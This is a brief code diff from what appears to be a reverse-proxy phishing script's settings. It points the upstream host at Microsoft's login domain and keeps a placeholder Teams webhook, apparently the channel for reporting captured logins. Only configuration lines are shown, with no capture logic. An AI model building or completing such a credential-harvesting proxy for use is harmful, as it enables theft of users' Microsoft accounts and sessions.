@@ -1,5 +1,5 @@
 // Microsoft
-const upstream = 'nline.com'
+const upstream = 'login.microsoftonline.com'
 const upstream_path = '/'
 const https = true
 const webhook = "<TEAMS_WEBHOOK>"
